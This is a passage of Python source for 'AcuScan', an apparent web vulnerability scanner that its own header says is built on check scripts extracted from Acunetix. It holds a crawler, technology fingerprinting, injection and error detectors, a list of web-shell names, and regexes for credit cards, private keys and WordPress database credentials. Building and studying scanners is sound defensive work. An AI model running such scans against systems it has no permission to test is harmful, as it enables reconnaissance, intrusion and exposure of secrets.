#!/usr/bin/env python3
"""
AcuScan v2.0
======================================
Production-grade web vulnerability scanner based on Acunetix check extraction.
Implements ALL 423 extracted check scripts + 636 XML vuln definitions.

Features:
  - Full CLI with nuclei-style arguments
  - Rate limiting & concurrency control
  - 8 scan phases (PerServer, PerFolder, PerFile, PerScheme, PostCrawl, PostScan, WebApps, Network)
  - SQLi, XSS, RCE, LFI, RFI, CRLF, SSRF detection
  - Backup file discovery, sensitive file/dir checks
  - Web application fingerprinting (WordPress, Joomla, Drupal, etc.)
  - Error message detection, path disclosure, info leakage
  - Directory listing detection
  - Technology fingerprinting (headers, cookies, body patterns)
  - Pretty colored output with silent mode
  - JSON/text output support
  - Multi-target support

Usage:
  python3 scanner.py -u https://target.com
  python3 scanner.py -l targets.txt -o results.json -c 50
  python3 scanner.py -u https://target.com -severity high,critical
"""

import os
import re
import sys
import ssl
import json
import time
import signal
import hashlib
import logging
import argparse
import threading
import traceback
from io import StringIO
from datetime import datetime
from pathlib import Path
from queue import Queue, Empty
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, OrderedDict
import tarfile
import shutil
import subprocess
import sqlite3
import struct

try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    HAS_BROTLI = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("\033[91m[!] requests library required: pip install requests\033[0m")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import colorama
    colorama.init(autoreset=True)
except ImportError:
    pass

# ═══════════════════════════════════════════════════════════════════════════════
#  Constants & Configuration
# ═══════════════════════════════════════════════════════════════════════════════

VERSION = "2.0.0"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_DB_PATH = os.path.join(SCRIPT_DIR, "data", "checks_db.json")
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_ARCHIVE_PREFIX = "updatedbd"  # archives: updatedbd_VERSION.tgz
IS_WINDOWS = (sys.platform == "win32")

# ── Cross-platform Acunetix path detection ──
def _detect_acunetix_paths():
    """Return (scripts_dir, install_dir) based on platform."""
    if IS_WINDOWS:
        # Windows: C:\ProgramData\Acunetix\shared\...
        pd = os.environ.get("ProgramData", r"C:\ProgramData")
        pf = os.environ.get("ProgramFiles", r"C:\Program Files")
        script_candidates = [
            os.path.join(SCRIPT_DIR, "acunetix_scripts", "Scripts"),
            os.path.join(SCRIPT_DIR, "Scripts"),
            os.path.join(pd, "Acunetix", "shared", "Scripts"),
            os.path.join(pf, "Acunetix", "data", "Scripts"),
        ]
        install_candidates = [
            os.path.join(pd, "Acunetix"),
            os.path.join(pf, "Acunetix"),
        ]
    else:
        # Linux/macOS
        script_candidates = [
            os.path.join(SCRIPT_DIR, "acunetix_scripts", "Scripts"),
            os.path.join(SCRIPT_DIR, "Scripts"),
            "/home/acunetix/.acunetix/data/Scripts",
            os.path.expanduser("~/.acunetix/data/Scripts"),
            "/opt/acunetix/data/Scripts",
        ]
        install_candidates = [
            "/home/acunetix/.acunetix",
            os.path.expanduser("~/.acunetix"),
            "/opt/acunetix",
        ]

    scripts = None
    for p in script_candidates:
        if os.path.isdir(p):
            if os.path.isdir(os.path.join(p, "Includes")) or os.path.isdir(os.path.join(p, "PerServer")):
                scripts = p
                break

    install = None
    for p in install_candidates:
        if os.path.isdir(p):
            install = p
            break

    return scripts, install

DEFAULT_ACUNETIX_SCRIPTS, ACUNETIX_INSTALL_DIR = _detect_acunetix_paths()

# ANSI Colors
class C:
    RST = "\033[0m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    GRY = "\033[90m"
    BRED = "\033[1;91m"
    BGRN = "\033[1;92m"
    BYLW = "\033[1;93m"
    BBLU = "\033[1;94m"
    BMAG = "\033[1;95m"
    BCYN = "\033[1;96m"

SEVERITY_COLORS = {
    "critical": C.BRED,
    "high":     C.RED,
    "medium":   C.YLW,
    "low":      C.BLU,
    "info":     C.CYN,
}

SEVERITY_ICONS = {
    "critical": "🔴",
    "high":     "🟠",
    "medium":   "🟡",
    "low":      "🔵",
    "info":     "⚪",
}

BANNER = f"""
{C.CYN}╔══════════════════════════════════════════════════════════════════╗
║  {C.WHT} █████   ██████ ██    ██ ███████  ██████  █████  ███    ██{C.CYN}    ║
║  {C.WHT}██   ██ ██      ██    ██ ██      ██      ██   ██ ████   ██{C.CYN}    ║
║  {C.WHT}███████ ██      ██    ██ ███████ ██      ███████ ██ ██  ██{C.CYN}    ║
║  {C.WHT}██   ██ ██      ██    ██      ██ ██      ██   ██ ██  ██ ██{C.CYN}    ║
║  {C.WHT}██   ██  ██████  ██████  ███████  ██████ ██   ██ ██   ████{C.CYN}    ║
║                                                                  ║
║  {C.GRN}AcuScan v{VERSION}  {C.GRY}(c) tg:@Neoleads{C.CYN}                              ║
║  {C.GRY}Web Vulnerability Scanner{C.CYN}                                     ║
╚══════════════════════════════════════════════════════════════════╝{C.RST}
"""

# ═══════════════════════════════════════════════════════════════════════════════
#  Utility Functions
# ═══════════════════════════════════════════════════════════════════════════════

def normalize_url(url):
    """Normalize target URL."""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"

def safe_url_join(base, path):
    """Safely join base URL with path."""
    if not path:
        return base
    if path.startswith(('http://', 'https://')):
        return path
    if not path.startswith('/'):
        path = '/' + path
    parsed = urlparse(base)
    return f"{parsed.scheme}://{parsed.netloc}{path}"


def is_clean_path(path):
    """Filter out JavaScript code fragments that were mis-extracted as URLs."""
    if not path or not isinstance(path, str):
        return False
    # Must start with /
    if not path.startswith('/'):
        return False
    # Reject JS code artifacts
    bad_patterns = [
        '"', "'", '+', '(', ')', '{', '}', '==', '!=', ';', '\\',
        'function', 'var ', 'if ', 'else ', '&&', '||', 'return ',
        '.get', '.set', '.push', '.pop', '.length', 'http.', 'new ',
        'null,', 'true,', 'false,', 'undefined', 'dirName', 'testURI',
        'randomStr', 'randStr', 'rootDir', 'rootPath', 'childPath',
        'ri.', 'job,', 'AddReportItem', 'setHttpInfo', 'LoadFromFile',
        'hostname', 'siteRoot', 'MARKED_AS', 'getGlobalValue', 'SetGlobalValue',
        'getCurrentDirectory', 'fullPath', '[bold]', '${fname}', '${dirname}',
        'matchedText', 'alerts', 'TReportItem', 'addHTTPJob',
        '\\n', '\\r', '\\t', 'RegExp', '\\s', '\\d',
        '«version»', '\u00ab', # version pattern markers
    ]
    for b in bad_patterns:
        if b in path:
            return False
    # Reject paths that are too long (likely code)
    if len(path) > 200:
        return False
    # Reject paths with multiple consecutive special chars
    if re.search(r'[*?|<>]{2,}', path):
        return False
    return True

def truncate(text, maxlen=80):
    """Truncate text for display."""
    if not text:
        return ""
    text = str(text).replace('\n', ' ').replace('\r', '')
    if len(text) > maxlen:
        return text[:maxlen-3] + "..."
    return text

def compile_regex(pattern, flags_str=""):
    """Compile a JavaScript regex pattern to Python."""
    try:
        py_flags = 0
        if 'i' in flags_str:
            py_flags |= re.IGNORECASE
        if 's' in flags_str:
            py_flags |= re.DOTALL
        if 'm' in flags_str:
            py_flags |= re.MULTILINE
        # Convert JS-specific syntax
        pattern = pattern.replace('[\\s\\S]', '[\\s\\S]')
        return re.compile(pattern, py_flags)
    except re.error:
        return None

def luhn_check(num_str):
    """Validate credit card number with Luhn algorithm."""
    try:
        digits = [int(d) for d in num_str if d.isdigit()]
        if len(digits) < 13:
            return False
        total = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        return total % 10 == 0
    except:
        return False

# ═══════════════════════════════════════════════════════════════════════════════
#  Rate Limiter
# ═══════════════════════════════════════════════════════════════════════════════

class RateLimiter:
    """Token bucket rate limiter."""
    def __init__(self, rate_per_second):
        self.rate = max(1, rate_per_second)
        self.tokens = float(rate_per_second)
        self.last_time = time.monotonic()
        self.lock = threading.Lock()

    def acquire(self):
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_time
            self.last_time = now
            self.tokens = min(self.rate, self.tokens + elapsed * self.rate)
            if self.tokens < 1:
                sleep_time = (1 - self.tokens) / self.rate
                time.sleep(sleep_time)
                self.tokens = 0
            else:
                self.tokens -= 1

# ═══════════════════════════════════════════════════════════════════════════════
#  HTTP Client
# ═══════════════════════════════════════════════════════════════════════════════

class HTTPClient:
    """Thread-safe HTTP client with rate limiting and redirect control."""

    def __init__(self, config):
        self.config = config
        self.rate_limiter = RateLimiter(config.get("rate_limit", 150))
        self.request_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self._build_session()

    def _build_session(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": self.config.get("user_agent", DEFAULT_UA),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })
        retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

        # Proxy support (http, https, socks4, socks5)
        proxy_url = self.config.get("proxy")
        if proxy_url:
            self.session.proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

    def request(self, method, url, **kwargs):
        """Make an HTTP request with rate limiting."""
        self.rate_limiter.acquire()
        timeout = kwargs.pop('timeout', self.config.get("timeout", 10))
        allow_redirects = kwargs.pop('allow_redirects', self.config.get("follow_redirects", True))
        max_redirects = self.config.get("max_redirects", 10)

        if self.config.get("disable_redirects", False):
            allow_redirects = False

        try:
            kwargs.setdefault('verify', False)
            kwargs.setdefault('timeout', timeout)
            kwargs.setdefault('allow_redirects', allow_redirects)

            if allow_redirects and max_redirects:
                self.session.max_redirects = max_redirects

            resp = self.session.request(method, url, **kwargs)
            with self.lock:
                self.request_count += 1
            return resp
        except requests.exceptions.TooManyRedirects:
            with self.lock:
                self.error_count += 1
            return None
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.error_count += 1
            return None
        except requests.exceptions.Timeout:
            with self.lock:
                self.error_count += 1
            return None
        except Exception:
            with self.lock:
                self.error_count += 1
            return None

    def get(self, url, **kwargs):
        return self.request('GET', url, **kwargs)

    def post(self, url, **kwargs):
        return self.request('POST', url, **kwargs)

    def head(self, url, **kwargs):
        return self.request('HEAD', url, **kwargs)

    def options(self, url, **kwargs):
        return self.request('OPTIONS', url, **kwargs)

    def put(self, url, **kwargs):
        return self.request('PUT', url, **kwargs)

# ═══════════════════════════════════════════════════════════════════════════════
#  Finding / Report Item
# ═══════════════════════════════════════════════════════════════════════════════

class Finding:
    """Represents a single vulnerability finding."""
    _counter = 0
    _lock = threading.Lock()

    def __init__(self, name, severity, url, detail="", vuln_ref="", evidence="",
                 cve="", cwe="", cvss="", tags="", category="", check_name=""):
        with Finding._lock:
            Finding._counter += 1
            self.id = Finding._counter
        self.name = name
        self.severity = severity.lower() if severity else "info"
        self.url = url
        self.detail = detail
        self.vuln_ref = vuln_ref
        self.evidence = truncate(evidence, 200)
        self.cve = cve
        self.cwe = cwe
        self.cvss = cvss
        self.tags = tags
        self.category = category
        self.check_name = check_name
        self.timestamp = datetime.now().isoformat()

    def to_dict(self):
        return {
            "id": self.id,
            "name": self.name,
            "severity": self.severity,
            "url": self.url,
            "detail": self.detail,
            "vuln_ref": self.vuln_ref,
            "evidence": self.evidence,
            "cve": self.cve,
            "cwe": self.cwe,
            "cvss": self.cvss,
            "tags": self.tags,
            "category": self.category,
            "check_name": self.check_name,
            "timestamp": self.timestamp,
        }

    def __repr__(self):
        return f"Finding({self.severity}: {self.name} @ {self.url})"

# ═══════════════════════════════════════════════════════════════════════════════
#  Output Formatter
# ═══════════════════════════════════════════════════════════════════════════════

class OutputFormatter:
    """Pretty output formatting."""

    def __init__(self, no_color=False, silent=False):
        self.no_color = no_color
        self.silent = silent
        self.lock = threading.Lock()

    def _c(self, color, text):
        if self.no_color:
            return text
        return f"{color}{text}{C.RST}"

    def banner(self):
        if self.silent:
            return
        if self.no_color:
            print("AcuScan v" + VERSION)
            print("=" * 60)
        else:
            print(BANNER)

    def info(self, msg):
        if not self.silent:
            with self.lock:
                print(f"  {self._c(C.GRY, '[')} {self._c(C.CYN, 'INF')} {self._c(C.GRY, ']')} {msg}")

    def warn(self, msg):
        if not self.silent:
            with self.lock:
                print(f"  {self._c(C.GRY, '[')} {self._c(C.YLW, 'WRN')} {self._c(C.GRY, ']')} {msg}")

    def error(self, msg):
        with self.lock:
            print(f"  {self._c(C.GRY, '[')} {self._c(C.RED, 'ERR')} {self._c(C.GRY, ']')} {msg}")

    def phase(self, name, desc=""):
        if not self.silent:
            with self.lock:
                line = f"\n  {self._c(C.BCYN, '━━━')} {self._c(C.BLD + C.WHT, name)}"
                if desc:
                    line += f" {self._c(C.GRY, f'({desc})')}"
                print(line)

    def progress(self, current, total, prefix=""):
        if self.silent:
            return
        with self.lock:
            pct = int(100 * current / total) if total > 0 else 0
            bar_len = 30
            filled = int(bar_len * current / total) if total > 0 else 0
            bar = "█" * filled + "░" * (bar_len - filled)
            color = C.GRN if pct == 100 else C.CYN
            sys.stdout.write(f"\r  {self._c(C.GRY, prefix)} {self._c(color, bar)} {self._c(C.WHT, f'{pct:3d}%')} {self._c(C.GRY, f'({current}/{total})')}")
            if current >= total:
                sys.stdout.write("\n")
            sys.stdout.flush()

    def finding(self, f):
        """Print a finding."""
        with self.lock:
            sev = f.severity
            color = SEVERITY_COLORS.get(sev, C.WHT)
            icon = SEVERITY_ICONS.get(sev, "•")
            sev_tag = self._c(color, f"[{sev.upper():>8s}]")
            name = self._c(C.WHT + C.BLD, f.name)
            url = self._c(C.GRY, f.url)
            print(f"  {icon} {sev_tag} {name}")
            print(f"     {self._c(C.GRY, '↳')} {url}")
            if f.detail:
                print(f"     {self._c(C.GRY, '  ')} {self._c(C.DIM, truncate(f.detail, 100))}")
            if f.cve:
                print(f"     {self._c(C.GRY, '  CVE:')} {self._c(C.YLW, f.cve)}")

    def summary(self, findings, elapsed, requests_made, errors):
        """Print scan summary."""
        if self.silent:
            return
        counts = defaultdict(int)
        for f in findings:
            counts[f.severity] += 1

        print(f"\n  {self._c(C.BCYN, '═══')} {self._c(C.BLD + C.WHT, 'Scan Summary')} {self._c(C.BCYN, '═══')}")
        print()
        print(f"  {self._c(C.GRY, 'Duration:')}    {elapsed:.1f}s")
        print(f"  {self._c(C.GRY, 'Requests:')}    {requests_made}")
        print(f"  {self._c(C.GRY, 'Errors:')}      {errors}")
        print(f"  {self._c(C.GRY, 'Findings:')}    {len(findings)}")
        print()

        for sev in ["critical", "high", "medium", "low", "info"]:
            if counts[sev] > 0:
                color = SEVERITY_COLORS.get(sev, C.WHT)
                icon = SEVERITY_ICONS.get(sev, "•")
                bar = "█" * min(counts[sev], 50)
                print(f"  {icon} {self._c(color, f'{sev.upper():>8s}')} {self._c(color, bar)} {self._c(C.WHT, str(counts[sev]))}")

        print()

# ═══════════════════════════════════════════════════════════════════════════════
#  Core Scanner Engine
# ═══════════════════════════════════════════════════════════════════════════════

class Scanner:
    """Main vulnerability scanner engine."""

    def __init__(self, config):
        self.config = config
        self.http = HTTPClient(config)
        self.out = OutputFormatter(
            no_color=config.get("no_color", False),
            silent=config.get("silent", False)
        )
        self.findings = []
        self.findings_lock = threading.Lock()
        self.db = None
        self.crawled_urls = set()
        self.crawled_forms = []
        self.crawled_params = defaultdict(set)
        self.tech_stack = {}
        self.stop_event = threading.Event()

        # Compiled pattern caches
        self._compiled_sqli_plain = []
        self._compiled_sqli_regex = []
        self._compiled_xss_regex = []
        self._compiled_error_plain = []
        self._compiled_error_regex = []
        self._compiled_lfi_plain = []
        self._compiled_lfi_regex = []
        self._compiled_fi_plain = []
        self._compiled_fi_regex = []
        self._compiled_rce_regex = []
        self._compiled_crlf_regex = []
        self._compiled_dirlist_plain = []
        self._compiled_dirlist_regex = []

    def add_finding(self, finding):
        """Thread-safe add finding."""
        with self.findings_lock:
            # Deduplicate by name+url
            key = f"{finding.name}|{finding.url}"
            for existing in self.findings:
                if f"{existing.name}|{existing.url}" == key:
                    return
            self.findings.append(finding)
            # Apply severity filter
            severity_filter = self.config.get("severity_filter", [])
            if severity_filter and finding.severity not in severity_filter:
                return
            self.out.finding(finding)

    def load_database(self, db_path=None):
        """Load the checks database."""
        path = db_path or self.config.get("db_path") or DEFAULT_DB_PATH
        if not os.path.isfile(path):
            self.out.error(f"Database not found: {path}")
            self.out.info("Run: python3 updater/extract_checks.py")
            sys.exit(1)

        with open(path, 'r', encoding='utf-8') as f:
            self.db = json.load(f)

        self.out.info(f"Loaded database: {os.path.basename(path)} ({os.path.getsize(path)//1024}KB)")

        # Pre-compile patterns
        self._compile_patterns()

    def _compile_patterns(self):
        """Pre-compile all detection patterns for performance."""
        ip = self.db.get("injection_patterns", {})

        # SQLi
        sqli = ip.get("sql_injection", {})
        self._compiled_sqli_plain = [p.lower() for p in sqli.get("plain", [])]
        for r in sqli.get("regex", []):
            compiled = compile_regex(r.get("pattern", ""), r.get("flags", ""))
            if compiled:
                self._compiled_sqli_regex.append(compiled)

        # Error messages
        errs = ip.get("error_messages", {})
        self._compiled_error_plain = [p.lower() for p in errs.get("plain", [])]
        for r in errs.get("regex", []):
            compiled = compile_regex(r.get("pattern", ""), r.get("flags", ""))
            if compiled:
                self._compiled_error_regex.append(compiled)

        # LFI / Directory Traversal
        dt = ip.get("directory_traversal", {})
        self._compiled_lfi_plain = dt.get("plain", [])
        for r in dt.get("regex", []):
            compiled = compile_regex(r.get("pattern", ""), r.get("flags", ""))
            if compiled:
                self._compiled_lfi_regex.append(compiled)

        # File Inclusion
        fi = ip.get("file_inclusion", {})
        self._compiled_fi_plain = fi.get("plain", [])
        for r in fi.get("regex", []):
            compiled = compile_regex(r.get("pattern", ""), r.get("flags", ""))
            if compiled:
                self._compiled_fi_regex.append(compiled)

        # Code Execution
        rce = ip.get("code_execution", {})
        for r in rce.get("regex", []):
            compiled = compile_regex(r.get("pattern", ""), r.get("flags", ""))
            if compiled:
                self._compiled_rce_regex.append(compiled)

        # CRLF
        crlf = ip.get("crlf_injection", {})
        for r in crlf.get("regex", []):
            compiled = compile_regex(r.get("pattern", ""), r.get("flags", ""))
            if compiled:
                self._compiled_crlf_regex.append(compiled)

        # Directory listing
        dl = ip.get("dir_listing", {})
        self._compiled_dirlist_plain = [p.lower() for p in dl.get("plain", [])]
        for r in dl.get("regex", []):
            compiled = compile_regex(r.get("pattern", ""), r.get("flags", ""))
            if compiled:
                self._compiled_dirlist_regex.append(compiled)

    # ─── Detection Helpers ────────────────────────────────────────────────

    def detect_sqli(self, text):
        """Check response text for SQL injection indicators."""
        if not text:
            return None
        text_lower = text.lower()
        for p in self._compiled_sqli_plain:
            if p in text_lower:
                return p
        for rx in self._compiled_sqli_regex:
            m = rx.search(text)
            if m:
                return m.group(0)[:200]
        return None

    def detect_errors(self, text):
        """Check response for application error messages."""
        if not text:
            return None
        text_lower = text.lower()
        for p in self._compiled_error_plain:
            if p in text_lower:
                return p
        for rx in self._compiled_error_regex:
            m = rx.search(text)
            if m:
                return m.group(0)[:200]
        return None

    def detect_lfi(self, text):
        """Check response for LFI/directory traversal indicators."""
        if not text:
            return None
        for p in self._compiled_lfi_plain:
            if p in text:
                return p
        for rx in self._compiled_lfi_regex:
            m = rx.search(text)
            if m:
                return m.group(0)[:200]
        return None

    def detect_fi(self, text):
        """Check response for file inclusion indicators."""
        if not text:
            return None
        for p in self._compiled_fi_plain:
            if p in text:
                return p
        for rx in self._compiled_fi_regex:
            m = rx.search(text)
            if m:
                return m.group(0)[:200]
        return None

    def detect_rce(self, text):
        """Check response for code execution indicators."""
        if not text:
            return None
        for rx in self._compiled_rce_regex:
            m = rx.search(text)
            if m:
                return m.group(0)[:200]
        return None

    def detect_dirlist(self, text):
        """Check response for directory listing."""
        if not text:
            return None
        text_lower = text.lower()
        for p in self._compiled_dirlist_plain:
            if p in text_lower:
                return p
        for rx in self._compiled_dirlist_regex:
            m = rx.search(text)
            if m:
                return m.group(0)[:100]
        return None

    def detect_xss_reflection(self, text, payload):
        """Check if XSS payload is reflected in response."""
        if not text or not payload:
            return False
        return payload in text

    # ─── Content Analysis Helpers ─────────────────────────────────────────

    def detect_phpinfo(self, text):
        if text and '<title>phpinfo()</title>' in text:
            return True
        return False

    def detect_internal_ip(self, text):
        if not text:
            return None
        m = re.search(r'\b(192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|10\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', text)
        if m and not m.group(0).startswith('127.0.'):
            return m.group(0)
        return None

    def detect_email_addresses(self, text):
        if not text:
            return []
        return re.findall(r'[_a-zA-Z\d\-\.]+@(?:[_a-zA-Z\d\-]+(?:\.[_a-zA-Z\d\-]+)+)', text)

    def detect_credit_cards(self, text):
        if not text:
            return []
        matches = re.findall(r'\b((?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11}))\b', text)
        return [m for m in matches if luhn_check(m)]

    def detect_private_key(self, text):
        if not text:
            return None
        m = re.search(r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----', text)
        return m.group(0) if m else None

    def detect_path_disclosure_unix(self, text):
        if not text:
            return None
        m = re.search(r'[\s\t:><|\(\)\[\}](/(var|www|usr|Users|user|tmp|etc|home|mnt|mount|root|proc)/[\w/\.]*(\.\w+)?)', text)
        if m:
            path = m.group(1)
            parts = path.split('/')
            if len(parts) > 3:
                ext = path.rsplit('.', 1)[-1].lower() if '.' in path else ''
                if ext != 'js':
                    return path
        return None

    def detect_path_disclosure_windows(self, text):
        if not text:
            return None
        m = re.search(r'([a-z]):\\(program files|windows|inetpub|php|document and settings|www|winnt|xampp|wamp|temp|websites|apache|apache2|site|sites|htdocs|web|http)[\\w]+(\.\w+)?', text, re.I)
        return m.group(0) if m else None

    def detect_source_code(self, text):
        if not text:
            return None
        patterns = [
            (r'(\<%[\s\S]*Response\.Write[\s\S]*%\>)', "ASP source code"),
            (r'^#\!/[\s\S]*/perl', "Perl source code"),
            (r'\<\?(php|\s+)[\x20-\x80\x0d\x0a\x09]+', "PHP source code"),
        ]
        for pat, desc in patterns:
            m = re.search(pat, text, re.I)
            if m:
                return desc
        return None

    def detect_trojan_shell(self, text):
        if not text:
            return None
        indicators = [
            "nsTView", "WSO ", "ASPXSpy", "c99shell", "r57shell",
            "simple-backdoor.php?cmd=", "Crystal shell",
            "execute command:", "ASPX Shell by LT"
        ]
        for ind in indicators:
            if ind.lower() in text.lower():
                return ind
        return None

    def detect_wordpress_creds(self, text):
        if not text:
            return None
        m = re.search(r"define\('DB_NAME',\s+'\w+'\);.*define\('DB_USER',\s+'\w+'\);.*define\('DB_PASSWORD',", text, re.DOTALL)
        return m.group(0)[:100] if m else None

    def detect_mysql_dump(self, text):
        if not text:
            return None
        if '-- phpMyAdmin SQL Dump' in text:
            return 'phpMyAdmin SQL Dump'
        if '-- MySQL dump ' in text:
            return 'MySQL dump'
        return None

    def detect_env_variables(self, text):
        if not text:
            return None
        m = re.search(r'(GATEWAY_INTERFACE[\s\S]*?CGI/1\.[01]|SERVER_PROTOCOL[\s\S]*?HTTP/1\.[10]|COMMONPROGRAMFILES[\s\S]*?C:\\Program\sFiles\\Common\sFiles|java\.runtime\.name|sun\.boot\.library\.path)', text, re.I)
        return m.group(0)[:100] if m else None

    # ─── Crawl / Discovery ────────────────────────────────────────────────

    def crawl(self, base_url, max_depth=3, max_pages=200):
        """Basic crawl to discover URLs, forms, and parameters."""
        self.out.phase("Crawl", f"max_depth={max_depth}, max_pages={max_pages}")

        visited = set()
        queue = [(base_url, 0)]
        parsed_base = urlparse(base_url)

        while queue and len(visited) < max_pages:
            if self.stop_event.is_set():
                break
            url, depth = queue.pop(0)
            if url in visited or depth > max_depth:
                continue
            visited.add(url)

            resp = self.http.get(url, timeout=10)
            if not resp:
                continue

            self.crawled_urls.add(url)
            body = resp.text

            # Extract parameters from URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param_name in params:
                self.crawled_params[url].add(param_name)

            if not HAS_BS4:
                # Fallback: extract links with regex
                for m in re.finditer(r'href=["\'](.*?)["\']', body, re.I):
                    link = m.group(1)
                    abs_url = urljoin(url, link)
                    p = urlparse(abs_url)
                    if p.netloc == parsed_base.netloc and abs_url not in visited:
                        queue.append((abs_url, depth + 1))
                continue

            soup = BeautifulSoup(body, 'html.parser')

            # Extract links
            for tag in soup.find_all(['a', 'link', 'area'], href=True):
                link = tag['href']
                abs_url = urljoin(url, link)
                p = urlparse(abs_url)
                if p.netloc == parsed_base.netloc and abs_url not in visited:
                    queue.append((abs_url, depth + 1))

            # Extract script/img/iframe sources
            for tag in soup.find_all(['script', 'img', 'iframe'], src=True):
                src = tag['src']
                abs_url = urljoin(url, src)
                self.crawled_urls.add(abs_url)

            # Extract forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                abs_action = urljoin(url, action) if action else url

                inputs = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    inp_name = inp.get('name', '')
                    inp_type = inp.get('type', 'text')
                    inp_value = inp.get('value', '')
                    if inp_name:
                        inputs.append({
                            "name": inp_name,
                            "type": inp_type,
                            "value": inp_value
                        })
                        self.crawled_params[abs_action].add(inp_name)

                if inputs:
                    self.crawled_forms.append({
                        "action": abs_action,
                        "method": method,
                        "inputs": inputs,
                        "source": url
                    })

        self.out.info(f"Crawled {len(self.crawled_urls)} URLs, {len(self.crawled_forms)} forms, {sum(len(v) for v in self.crawled_params.values())} params")

    # ─── Technology Detection ─────────────────────────────────────────────

    def detect_technology(self, base_url):
        """Detect web server technology and frameworks."""
        self.out.phase("Technology Detection")

        resp = self.http.get(base_url)
        if not resp:
            return

        headers = resp.headers
        body = resp.text

        # Server header
        server = headers.get('Server', '')
        if server:
            self.tech_stack['server'] = server
            self.out.info(f"Server: {server}")

        # X-Powered-By
        xpb = headers.get('X-Powered-By', '')
        if xpb:
            self.tech_stack['powered_by'] = xpb
            self.out.info(f"X-Powered-By: {xpb}")

        # X-AspNet-Version
        aspnet = headers.get('X-AspNet-Version', '')
        if aspnet:
            self.tech_stack['aspnet'] = aspnet
            self.out.info(f"ASP.NET: {aspnet}")

        # X-Generator / meta generator
        gen = headers.get('X-Generator', '')
        if not gen and body:
            m = re.search(r'<meta\s+name=["\'"]generator["\']\s+content=["\'](.*?)["\']', body, re.I)
            if m:
                gen = m.group(1)
        if gen:
            self.tech_stack['generator'] = gen
            self.out.info(f"Generator: {gen}")

        # Cookies
        cookies = resp.headers.get('Set-Cookie', '')
        if 'PHPSESSID' in cookies or 'PHPSESSID' in str(resp.cookies):
            self.tech_stack['php'] = True
            self.out.info("PHP detected (PHPSESSID)")
        if 'ASP.NET_SessionId' in cookies:
            self.tech_stack['aspnet_session'] = True
            self.out.info("ASP.NET detected (session cookie)")
        if 'JSESSIONID' in cookies:
            self.tech_stack['java'] = True
            self.out.info("Java detected (JSESSIONID)")
        if 'csrftoken' in cookies and 'django' not in self.tech_stack:
            self.tech_stack['django_possible'] = True

        # Security headers
        for hdr in ['X-Frame-Options', 'X-Content-Type-Options', 'Content-Security-Policy',
                     'Strict-Transport-Security', 'X-XSS-Protection', 'Referrer-Policy',
                     'Permissions-Policy', 'Cross-Origin-Opener-Policy']:
            val = headers.get(hdr, '')
            if val:
                self.tech_stack[f'header_{hdr}'] = val

    # ─── Phase 1: PerServer Checks ────────────────────────────────────────

    def phase_perserver(self, base_url):
        """Server-level checks: sensitive files, directories, misconfigs."""
        self.out.phase("Phase 1: PerServer Checks", f"{len(self.db.get('server_urls', []))} URLs")

        server_urls = [u for u in self.db.get("server_urls", []) if is_clean_path(u)]
        scripts = self.db.get("scripts", {}).get("PerServer", [])

        # Build URL-to-script mapping (filter out JS code fragments)
        url_to_script = {}
        for script in scripts:
            for url in script.get("urls", []):
                if is_clean_path(url):
                    url_to_script[url] = script
            for arr_key in ["arr_variants", "arr_urls", "arr_paths", "arr_uris", "arr_files"]:
                for url in script.get(arr_key, []):
                    if is_clean_path(url):
                        url_to_script[url] = script

        # Also add all server_urls not yet mapped
        all_urls = sorted(set(server_urls) | set(url_to_script.keys()))

        checked = 0
        total = len(all_urls)

        def check_url(url_path):
            nonlocal checked
            if self.stop_event.is_set():
                return
            full_url = safe_url_join(base_url, url_path)
            resp = self.http.get(full_url, timeout=8)

            if resp and resp.status_code == 200 and not self._is_custom_404(resp, base_url, url=full_url):
                body = resp.text
                # Check for URL-rewrite false positive
                ext = ''
                if '.' in url_path.split('/')[-1]:
                    ext = '.' + url_path.split('/')[-1].rsplit('.', 1)[-1]
                if self._looks_like_rewrite(resp, ext):
                    checked += 1
                    return

                script = url_to_script.get(url_path, {})
                vuln_refs = script.get("vuln_refs", [])
                check_name = script.get("name", "sensitive_file")

                # Determine severity and name from vuln_db
